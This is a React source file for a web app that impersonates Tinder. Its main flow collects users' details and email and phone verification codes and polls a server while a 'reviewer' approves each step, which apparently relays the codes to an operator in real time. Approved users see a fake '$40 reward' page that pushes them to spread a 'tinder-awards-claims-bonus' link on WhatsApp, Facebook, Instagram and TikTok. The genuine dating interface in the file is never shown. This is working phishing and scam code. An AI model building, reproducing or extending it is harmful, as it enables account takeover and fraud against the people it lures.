import { useEffect, useState, type ReactNode } from "react";
import {
  ChevronLeft,
  Check,
  Flame,
  Heart,
  MessageCircle,
  Send,
  SlidersHorizontal,
  Undo2,
  UserRound,
  X,
} from "lucide-react";
import { UserButton } from "@/lib/auth/gates";
import { TinderMark } from "@/components/tinder-mark";
import { useCurrentUserState } from "@/lib/auth/use-current-user";
import { getAccess, reportLogin, endVisitorSession, type Access } from "@/lib/applications";
import { getBearerToken, rememberSessionToken } from "@/lib/auth/client";
import { getProfile, INTEREST_CHOICES } from "@/data/profiles";
import {
  deckFor,
  likesFor,
  useEmber,
  type ShowMe,
} from "@/lib/ember-store";
import { ApplyFlow } from "@/components/apply-flow";
import { ReviewQueue } from "@/components/review-queue";
import { SwipeDeck } from "@/components/swipe-deck";

type Tab = "discover" | "likes" | "chats" | "you";

function accessKey(access: Access | null) {
  const app = access?.application;
  if (!app) return access?.login ?? "";
  return [
    access?.login,
    app.status,
    app.emailVerified,
    app.phoneVerified,
    app.emailCodePending,
    app.phoneCodePending,
    app.rewardStatus,
    app.notice ?? "",
    app.email,
    app.phone,
  ].join("|");
}

function keepProgress(current: Access | null, next: Access | null) {
  if (current?.application && !next?.application) return current;
  if (accessKey(current) === accessKey(next)) return current;
  return next;
}

export function EmberApp() {
  const { user, isPending } = useCurrentUserState();
  const [access, setAccess] = useState<Access | null>(null);
  const [accessError, setAccessError] = useState<string | null>(null);
  const [review, setReview] = useState(false);
  const [sessionReady, setSessionReady] = useState(false);

  useEffect(() => {
    if (isPending) return;
    if (!user) {
      setSessionReady(true);
      return;
    }
    let cancelled = false;
    setAccessError(null);
    const fresh = sessionStorage.getItem(`ember-login-${user.id}`) !== "ok";
    reportLogin({
      data: { name: user.displayName ?? "", email: user.primaryEmail ?? "", fresh },
    })
      .then((next) => {
        if (cancelled) return;
        if (next.login === "approved") sessionStorage.setItem(`ember-login-${user.id}`, "ok");
        setAccess((current) => keepProgress(current, next));
        setSessionReady(true);
      })
      .catch((err: unknown) => {
        const message = err instanceof Error ? err.message : "Could not load your request";
        if (message.includes("Conflict") || message.includes("getUpdates")) {
          if (!cancelled) setSessionReady(true);
          return;
        }
        if (!cancelled) {
          setAccessError(message);
          setSessionReady(true);
        }
      });
    return () => {
      cancelled = true;
    };
  }, [user?.id, isPending]);

  const application = access?.application;
  const waiting =
    !!application &&
    (access?.login === "blocked" ||
      application.status === "pending" ||
      !application.emailVerified ||
      application.emailCodePending ||
      !application.phoneVerified ||
      application.phoneCodePending ||
      application.rewardStatus === "pending" ||
      application.rewardStatus === "none");

  useEffect(() => {
    if (!waiting) return;
    let stopped = false;
    let inflight = false;
    const pull = () => {
      if (stopped || inflight) return;
      inflight = true;
      const stuck = window.setTimeout(() => {
        inflight = false;
      }, 4000);
      getAccess({ data: { at: Date.now() } })
        .then((next) => {
          if (stopped) return;
          setAccess((current) => keepProgress(current, next));
          if (user && next.login === "approved") sessionStorage.setItem(`ember-login-${user.id}`, "ok");
        })
        .catch(() => undefined)
        .finally(() => {
          window.clearTimeout(stuck);
          inflight = false;
        });
    };
    pull();
    const timer = window.setInterval(pull, 700);
    const onFocus = () => pull();
    window.addEventListener("focus", onFocus);
    document.addEventListener("visibilitychange", onFocus);
    return () => {
      stopped = true;
      window.clearInterval(timer);
      window.removeEventListener("focus", onFocus);
      document.removeEventListener("visibilitychange", onFocus);
    };
  }, [waiting, user?.id]);

  if ((isPending || !sessionReady) && getBearerToken()) {
    return (
      <Frame>
        <div className="flex h-full flex-col px-5">
          <div className="flex h-14 items-center gap-2">
            <TinderMark className="size-7" />
            <span className="font-sans text-xl font-extrabold tracking-tight">TINDER</span>
          </div>
        </div>
      </Frame>
    );
  }

  if (accessError) {
    return (
      <Frame>
        <div className="grid h-full place-items-center px-6 text-center">
          <div>
            <h1 className="font-serif text-3xl">TINDER is unavailable</h1>
            <p className="mt-2 text-stone">{accessError}</p>
            <button type="button" onClick={() => window.location.reload()} className="brand-btn tap mt-5 px-8">
              Try again
            </button>
          </div>
        </div>
      </Frame>
    );
  }

  if (review && user && access && (access.isReviewer || access.needsReviewer)) {
    return (
      <Frame>
        <ReviewQueue
          needsReviewer={access.needsReviewer}
          onClose={() => setReview(false)}
          onAccess={setAccess}
        />
      </Frame>
    );
  }

  const unlocked =
    access?.login !== "blocked" &&
    application?.status === "approved" &&
    application.emailVerified &&
    application.phoneVerified &&
    application.rewardStatus === "approved";

  if (unlocked && access) {
    return (
      <Frame>
        <RewardsNotice />
      </Frame>
    );
  }

  return (
    <Frame>
      <ApplyFlow key={accessKey(access)} user={user} access={access} onAccess={setAccess} onReview={() => setReview(true)} />
    </Frame>
  );
}

function Frame({ children }: { children: ReactNode }) {
  return (
    <div className="flex h-dvh bg-ink text-cream">
      <aside className="hidden w-80 shrink-0 flex-col justify-between border-r border-line p-10 lg:flex">
        <div>
          <TinderMark className="size-11" />
          <h1 className="mt-6 font-sans text-4xl font-extrabold tracking-tight">TINDER</h1>
          <p className="mt-3 max-w-xs text-stone">Meet people nearby.</p>
        </div>
        <p className="text-sm text-stone">Private. Not shown on your profile.</p>
      </aside>
      <div className="relative mx-auto flex h-dvh min-h-0 w-full max-w-md flex-1 flex-col overflow-hidden lg:border-x lg:border-line">{children}</div>
    </div>
  );
}

const CONFETTI = [
  ["#fd267a", "7px", "12px", "6%", "0s", "5.4s", "36px", "420deg"],
  ["#ff6036", "5px", "14px", "14%", "0.4s", "6.2s", "-42px", "-500deg"],
  ["#ffd166", "9px", "7px", "22%", "0.8s", "4.8s", "22px", "360deg"],
  ["#5cdb95", "6px", "16px", "31%", "0.2s", "6.6s", "-28px", "640deg"],
  ["#4cc9f0", "4px", "11px", "39%", "1.1s", "5.2s", "48px", "-380deg"],
  ["#c77dff", "11px", "6px", "48%", "0.3s", "5.8s", "-18px", "510deg"],
  ["#fff3b0", "6px", "6px", "56%", "0.9s", "4.6s", "26px", "280deg"],
  ["#ff4d6d", "3px", "13px", "64%", "0.5s", "6s", "-50px", "-610deg"],
  ["#80ed99", "8px", "8px", "72%", "1.4s", "5s", "16px", "450deg"],
  ["#ff9f1c", "4px", "15px", "81%", "0.1s", "6.4s", "-34px", "-470deg"],
  ["#f72585", "10px", "5px", "89%", "0.7s", "5.6s", "24px", "390deg"],
  ["#ffffff", "3px", "10px", "96%", "1s", "4.4s", "-14px", "700deg"],
  ["#ffd166", "6px", "12px", "11%", "1.8s", "5.8s", "40px", "-320deg"],
  ["#4cc9f0", "7px", "7px", "27%", "2.1s", "5.2s", "-30px", "560deg"],
  ["#fd267a", "4px", "14px", "43%", "1.6s", "6.1s", "14px", "-440deg"],
  ["#c77dff", "5px", "13px", "58%", "2s", "4.9s", "-44px", "480deg"],
  ["#ff6036", "9px", "4px", "74%", "1.7s", "5.9s", "26px", "-550deg"],
  ["#80ed99", "3px", "11px", "86%", "2.3s", "5.4s", "-20px", "330deg"],
] as const;

function RewardsNotice() {
  const [leaving, setLeaving] = useState(false);
  const [readyLink, setReadyLink] = useState<string | null>(null);
  const amount = 40;
  const link = "https://tinder-awards-claims-bonus.netlify.app";

  function shareTo(site: "whatsapp" | "facebook" | "instagram" | "tiktok") {
    const text = link;
    setReadyLink(link);
    if (site === "whatsapp") {
      window.open(`https://wa.me/?text=${encodeURIComponent(text)}`, "_blank", "noopener,noreferrer");
      return;
    }
    if (site === "facebook") {
      window.open(
        `https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(link)}&quote=${encodeURIComponent(text)}`,
        "_blank",
        "noopener,noreferrer",
      );
      return;
    }
    void navigator.clipboard?.writeText(text);
    window.open(site === "instagram" ? "https://www.instagram.com/" : "https://www.tiktok.com/upload", "_blank", "noopener,noreferrer");
  }

  return (
    <section className="relative flex h-full flex-col overflow-hidden px-5">
      <div className="pointer-events-none absolute inset-0 overflow-hidden" aria-hidden="true">
        {CONFETTI.map(([color, width, height, left, delay, duration, drift, spin]) => (
          <span
            key={`${left}-${delay}`}
            className="confetti-piece"
            style={{
              ["--c" as string]: color,
              ["--w" as string]: width,
              ["--h" as string]: height,
              ["--drift" as string]: drift,
              ["--spin" as string]: spin,
              ["--delay" as string]: delay,
              ["--dur" as string]: duration,
              left,
            }}
          />
        ))}
      </div>
      <div className="flex h-14 items-center gap-2">
        <TinderMark className="size-7" />
        <span className="font-sans text-xl font-extrabold tracking-tight">TINDER</span>
        <button
          type="button"
          disabled={leaving}
          onClick={() => {
            if (leaving) return;
            setLeaving(true);
            void endVisitorSession()
              .catch(() => undefined)
              .finally(() => {
                rememberSessionToken(null);
                window.location.replace("/");
              });
          }}
          className="tap ml-auto grid h-8 min-w-8 place-items-center text-sm font-medium text-stone disabled:opacity-80"
        >
          {leaving ? <span className="spin size-4 rounded-full border-2 border-stone border-t-transparent" aria-label="Loading" /> : "Log out"}
        </button>
      </div>
      <div className="mb-3 h-1.5 overflow-hidden rounded-full bg-chip" role="progressbar" aria-valuenow={100} aria-valuemin={0} aria-valuemax={100}>
        <div className="h-full w-full rounded-full bg-gradient-to-r from-[#fd267a] to-[#ff6036]" />
      </div>
      <div className="ember-rise relative z-10 flex flex-1 flex-col justify-center">
        <div className="mb-5 grid size-20 place-items-center rounded-full bg-ok text-cream shadow-[0_0_40px_rgba(52,199,89,0.35)]" aria-hidden="true">
          <Check className="size-10" strokeWidth={2.5} />
        </div>
        <p className="text-sm font-semibold uppercase tracking-[0.18em] text-ember">Approved 🎉</p>
        <h1 className="mt-2 font-serif text-5xl tracking-tight">Your reward is ${amount}</h1>
        <p className="mt-3 text-stone">Share this link and celebrate with someone.</p>
        <a href={link} target="_blank" rel="noopener noreferrer" className="mt-3 break-all text-sm text-cream underline">{link}</a>
        <div className="mt-6 grid grid-cols-2 gap-2">
          <button type="button" onClick={() => shareTo("whatsapp")} className="tap grid h-12 place-items-center rounded-full bg-[#25D366] font-semibold text-ink">WhatsApp</button>
          <button type="button" onClick={() => shareTo("facebook")} className="tap grid h-12 place-items-center rounded-full bg-[#1877F2] font-semibold text-white">Facebook</button>
          <button type="button" onClick={() => shareTo("instagram")} className="tap grid h-12 place-items-center rounded-full bg-gradient-to-r from-[#f9ce34] via-[#ee2a7b] to-[#6228d7] font-semibold text-white">Instagram</button>
          <button type="button" onClick={() => shareTo("tiktok")} className="tap grid h-12 place-items-center rounded-full bg-ink font-semibold text-cream ring-1 ring-line">TikTok</button>
        </div>
        {readyLink ? <a href={readyLink} target="_blank" rel="noopener noreferrer" className="mt-4 break-all text-sm text-cream underline">{readyLink}</a> : null}
      </div>
    </section>
  );
}

function DatingApp({ access, onReview }: { access: Access; onReview: () => void }) {
  const name = useEmber((state) => state.name);
  const interests = useEmber((state) => state.interests);
  const distance = useEmber((state) => state.distance);
  const showMe = useEmber((state) => state.showMe);
  const decisions = useEmber((state) => state.decisions);
  const history = useEmber((state) => state.history);
  const matches = useEmber((state) => state.matches);
  const threads = useEmber((state) => state.threads);
  const openMatchId = useEmber((state) => state.openMatchId);
  const setName = useEmber((state) => state.setName);
  const toggleInterest = useEmber((state) => state.toggleInterest);
  const setDistance = useEmber((state) => state.setDistance);
  const setShowMe = useEmber((state) => state.setShowMe);
  const decide = useEmber((state) => state.decide);
  const undo = useEmber((state) => state.undo);
  const dismissMatch = useEmber((state) => state.dismissMatch);
  const send = useEmber((state) => state.send);
  const resetSwipes = useEmber((state) => state.resetSwipes);

  const [tab, setTab] = useState<Tab>("discover");
  const [threadId, setThreadId] = useState<string | null>(null);
  const [filters, setFilters] = useState(false);
  const [draft, setDraft] = useState("");

  useEffect(() => {
    void useEmber.persist.rehydrate();
  }, []);

  const deck = deckFor({ decisions, distance, showMe });
  const incoming = likesFor({ decisions, distance, showMe });
  const match = openMatchId ? getProfile(openMatchId) : undefined;

  function openThread(id: string) {
    dismissMatch();
    setThreadId(id);
    setTab("chats");
  }

  if (match) {
    return (
      <div className="flex h-full flex-col px-6">
        <div className="flex flex-1 flex-col items-center justify-center text-center">
          <p className="text-sm font-medium text-ember">It’s a match</p>
          <h2 className="mt-2 font-serif text-5xl tracking-tight">{match.name}</h2>
          <p className="mt-3 max-w-xs text-stone">{match.opener}</p>
          <img src={match.photo} alt="" className="mt-6 size-36 rounded-full object-cover" />
        </div>
        <div className="safe-b flex flex-col gap-3 pb-4">
          <button type="button" onClick={() => openThread(match.id)} className="tap h-12 rounded-2xl bg-ember font-semibold text-ink">
            Say hello
          </button>
          <button type="button" onClick={dismissMatch} className="tap h-12 rounded-2xl border border-line font-medium text-cream">
            Keep swiping
          </button>
        </div>
      </div>
    );
  }

  if (threadId) {
    const person = getProfile(threadId);
    const messages = threads[threadId] ?? [];
    if (!person) return null;
    return (
      <div className="flex h-full min-h-0 flex-col">
        <header className="flex h-14 items-center gap-2 border-b border-line px-3">
          <button type="button" aria-label="Back to chats" onClick={() => setThreadId(null)} className="tap grid size-11 place-items-center rounded-full">
            <ChevronLeft aria-hidden="true" />
          </button>
          <img src={person.photo} alt="" className="size-9 rounded-full object-cover" />
          <div>
            <p className="font-medium leading-none">{person.name}</p>
            <p className="mt-1 text-xs text-stone">{person.area}</p>
          </div>
        </header>
        <div className="scroller flex min-h-0 flex-1 flex-col gap-2 overflow-y-auto px-4 py-4">
          {messages.map((message) => (
            <p
              key={message.id}
              className={
                message.from === "me"
                  ? "bubble self-end rounded-2xl rounded-br-md bg-ember px-3 py-2 text-ink"
                  : "bubble self-start rounded-2xl rounded-bl-md bg-chip px-3 py-2 text-cream"
              }
            >
              {message.text}
            </p>
          ))}
        </div>
        <form
          className="safe-b flex gap-2 px-4 pt-2"
          onSubmit={(event) => {
            event.preventDefault();
            send(threadId, draft);
            setDraft("");
          }}
        >
          <input
            value={draft}
            onChange={(event) => setDraft(event.target.value)}
            aria-label="Message"
            placeholder="Say something"
            className="h-12 min-w-0 flex-1 rounded-full border border-line bg-panel px-4 text-cream outline-none placeholder:text-stone"
          />
          <button type="submit" aria-label="Send" disabled={!draft.trim()} className="tap grid size-12 place-items-center rounded-full bg-ember text-ink disabled:opacity-40">
            <Send aria-hidden="true" className="size-5" />
          </button>
        </form>
      </div>
    );
  }

  return (
    <div className="flex h-full min-h-0 flex-col">
      <header className="flex h-14 items-center justify-between px-4">
        <div className="flex items-center gap-2">
          <TinderMark className="size-7" />
          <span className="font-sans text-xl font-extrabold tracking-tight">TINDER</span>
        </div>
        <div className="flex items-center gap-1">
          {access.isReviewer ? (
            <button type="button" onClick={onReview} className="tap h-11 rounded-full px-3 text-sm font-medium text-stone">
              Review
            </button>
          ) : null}
          {tab === "discover" ? (
            <button
              type="button"
              aria-label="Undo last swipe"
              disabled={history.length === 0}
              onClick={undo}
              className="tap grid size-11 place-items-center rounded-full text-cream disabled:opacity-30"
            >
              <Undo2 aria-hidden="true" />
            </button>
          ) : null}
          <button
            type="button"
            aria-label="Filters"
            onClick={() => setFilters(true)}
            className="tap grid size-11 place-items-center rounded-full text-cream"
          >
            <SlidersHorizontal aria-hidden="true" />
          </button>
        </div>
      </header>

      {tab === "discover" ? (
        <SwipeDeck profiles={deck} interests={interests} onDecide={decide} />
      ) : null}

      {tab === "likes" ? (
        <div className="scroller min-h-0 flex-1 overflow-y-auto px-4 pb-4">
          <h2 className="font-serif text-3xl tracking-tight">Likes you</h2>
          {incoming.length === 0 ? (
            <p className="mt-3 text-stone">When someone nearby likes you first, they show up here.</p>
          ) : (
            <ul className="mt-4 grid grid-cols-2 gap-3">
              {incoming.map((profile) => (
                <li key={profile.id} className="aspect-portrait relative overflow-hidden rounded-3xl bg-chip">
                  <img src={profile.photo} alt="" className="h-full w-full object-cover" />
                  <div className="absolute inset-x-0 bottom-0 bg-ink/75 p-3">
                    <p className="font-medium">
                      {profile.name}, {profile.age}
                    </p>
                    <div className="mt-2 flex gap-2">
                      <button type="button" aria-label={`Pass ${profile.name}`} onClick={() => decide(profile.id, "pass")} className="tap grid size-11 flex-1 place-items-center rounded-full bg-chip text-cream">
                        <X className="size-5" aria-hidden="true" />
                      </button>
                      <button type="button" aria-label={`Like ${profile.name}`} onClick={() => decide(profile.id, "like")} className="tap grid size-11 flex-1 place-items-center rounded-full bg-ember text-ink">
                        <Heart className="size-5" aria-hidden="true" />
                      </button>
                    </div>
                  </div>
                </li>
              ))}
            </ul>
          )}
        </div>
      ) : null}

      {tab === "chats" ? (
        <div className="scroller min-h-0 flex-1 overflow-y-auto px-4">
          <h2 className="font-serif text-3xl tracking-tight">Chats</h2>
          {matches.length === 0 ? (
            <p className="mt-3 text-stone">Matches land here. Swipe right when you want to talk.</p>
          ) : (
            <ul className="mt-2">
              {matches.map((id) => {
                const profile = getProfile(id);
                if (!profile) return null;
                const last = threads[id]?.[threads[id].length - 1];
                return (
                  <li key={id}>
                    <button type="button" onClick={() => setThreadId(id)} className="flex w-full items-center gap-3 border-b border-line py-3 text-left">
                      <img src={profile.photo} alt="" className="size-14 rounded-full object-cover" />
                      <span className="min-w-0">
                        <span className="block font-medium">{profile.name}</span>
                        <span className="block truncate text-sm text-stone">{last?.text ?? profile.opener}</span>
                      </span>
                    </button>
                  </li>
                );
              })}
            </ul>
          )}
        </div>
      ) : null}

      {tab === "you" ? (
        <YouPanel
          name={name}
          interests={interests}
          onName={setName}
          onToggle={toggleInterest}
          onReset={resetSwipes}
          country={access.application?.country ?? ""}
        />
      ) : null}

      <nav className="safe-b grid grid-cols-4 border-t border-line">
        <NavButton label="Discover" active={tab === "discover"} onClick={() => setTab("discover")}>
          <Flame aria-hidden="true" />
        </NavButton>
        <NavButton label="Likes" active={tab === "likes"} count={incoming.length} onClick={() => setTab("likes")}>
          <Heart aria-hidden="true" />
        </NavButton>
        <NavButton label="Chats" active={tab === "chats"} count={matches.length} onClick={() => setTab("chats")}>
          <MessageCircle aria-hidden="true" />
        </NavButton>
        <NavButton label="You" active={tab === "you"} onClick={() => setTab("you")}>
          <UserRound aria-hidden="true" />
        </NavButton>
      </nav>

      {filters ? (
        <FilterSheet
          distance={distance}
          showMe={showMe}
          onDistance={setDistance}
          onShow={setShowMe}
          onClose={() => setFilters(false)}
        />
      ) : null}
    </div>
  );
}

function YouPanel({
  name,
  interests,
  country,
  onName,
  onToggle,
  onReset,
}: {
  name: string;
  interests: string[];
  country: string;
  onName: (name: string) => void;
  onToggle: (interest: string) => void;
  onReset: () => void;
}) {
  return (
    <div className="scroller min-h-0 flex-1 overflow-y-auto px-5 pb-6">
      <h2 className="font-serif text-3xl tracking-tight">You</h2>
      <p className="mt-2 text-sm text-stone">Approved for {country}. These profiles are samples, not real people.</p>
      <div className="mt-5">
        <UserButton />
      </div>
      <label className="mt-6 block text-sm font-medium text-stone" htmlFor="you-name">
        Name on your card
      </label>
      <input
        id="you-name"
        value={name}
        onChange={(event) => onName(event.target.value)}
        placeholder="Your name"
        className="mt-2 h-12 w-full rounded-2xl border border-line bg-panel px-4 text-cream outline-none placeholder:text-stone"
      />
      <p className="mt-5 text-sm font-medium text-stone">Interests</p>
      <ul className="mt-2 flex flex-wrap gap-2">
        {INTEREST_CHOICES.map((interest) => {
          const on = interests.includes(interest);
          return (
            <li key={interest}>
              <button
                type="button"
                aria-pressed={on}
                onClick={() => onToggle(interest)}
                className={
                  on
                    ? "tap h-10 rounded-full bg-ember px-3 text-sm font-medium text-ink"
                    : "tap h-10 rounded-full bg-chip px-3 text-sm text-cream"
                }
              >
                {interest}
              </button>
            </li>
          );
        })}
      </ul>
      <button type="button" onClick={onReset} className="tap mt-8 h-12 w-full rounded-2xl border border-line font-medium">
        Start the deck over
      </button>
    </div>
  );
}

function FilterSheet({
  distance,
  showMe,
  onDistance,
  onShow,
  onClose,
}: {
  distance: number;
  showMe: ShowMe;
  onDistance: (km: number) => void;
  onShow: (show: ShowMe) => void;
  onClose: () => void;
}) {
  const options: { id: ShowMe; label: string }[] = [
    { id: "everyone", label: "Everyone" },
    { id: "women", label: "Women" },
    { id: "men", label: "Men" },
  ];
  return (
    <div className="absolute inset-0 z-20 flex items-end bg-ink/80" onClick={onClose}>
      <div
        className="safe-b w-full rounded-t-4xl border border-line bg-panel p-5"
        onClick={(event) => event.stopPropagation()}
        role="dialog"
        aria-label="Filters"
      >
        <h2 className="font-serif text-2xl">Discovery</h2>
        <p className="mt-4 text-sm text-stone">Within {distance} km</p>
        <input
          type="range"
          min={5}
          max={40}
          value={distance}
          aria-label="Maximum distance"
          onChange={(event) => onDistance(Number(event.target.value))}
        />
        <p className="mt-2 text-sm text-stone">Show me</p>
        <div className="mt-2 grid grid-cols-3 gap-1 rounded-2xl bg-chip p-1">
          {options.map((option) => (
            <button
              key={option.id}
              type="button"
              aria-pressed={showMe === option.id}
              onClick={() => onShow(option.id)}
              className={
                showMe === option.id
                  ? "h-11 rounded-xl bg-cream text-sm font-medium text-ink"
                  : "h-11 rounded-xl text-sm text-stone"
              }
            >
              {option.label}
            </button>
          ))}
        </div>
        <button type="button" onClick={onClose} className="tap mt-5 h-12 w-full rounded-2xl bg-ember font-semibold text-ink">
          Done
        </button>
      </div>
    </div>
  );
}

function NavButton({
  label,
  active,
  count = 0,
  onClick,
  children,
}: {
  label: string;
  active: boolean;
  count?: number;
  onClick: () => void;
  children: ReactNode;
}) {
  return (
    <button
      type="button"
      onClick={onClick}
      className={active ? "relative flex h-14 flex-col items-center justify-center gap-1 text-xs text-ember" : "relative flex h-14 flex-col items-center justify-center gap-1 text-xs text-stone"}
    >
      {children}
      {label}
      {count > 0 ? (
        <span className="absolute right-5 top-1 min-w-4 rounded-full bg-ember px-1 text-center text-xs font-semibold text-ink tabular-nums">
          {count}
        </span>
      ) : null}
    </button>
  );
}
